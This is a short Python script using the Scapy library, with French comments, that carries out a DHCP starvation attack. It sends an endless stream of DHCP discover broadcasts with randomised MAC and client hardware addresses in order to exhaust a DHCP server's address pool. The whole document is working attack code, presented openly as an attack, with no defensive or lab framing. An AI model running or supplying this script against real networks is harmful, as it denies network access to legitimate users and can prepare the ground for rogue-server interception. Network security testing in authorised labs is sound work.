from scapy.all import *
import random

def random_mac():
    """Génère une adresse MAC aléatoire."""
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )

def dhcp_starvation():
    """Lance l'attaque DHCP Starvation."""
    conf.checkIPaddr = False  # Désactive la vérification de l'adresse IP
    discover = (
        Ether(src=random_mac(), dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=RandString(12, "0123456789abcdef")) /
        DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(discover, loop=1, inter=0.1)

if __name__ == "__main__":
    dhcp_starvation()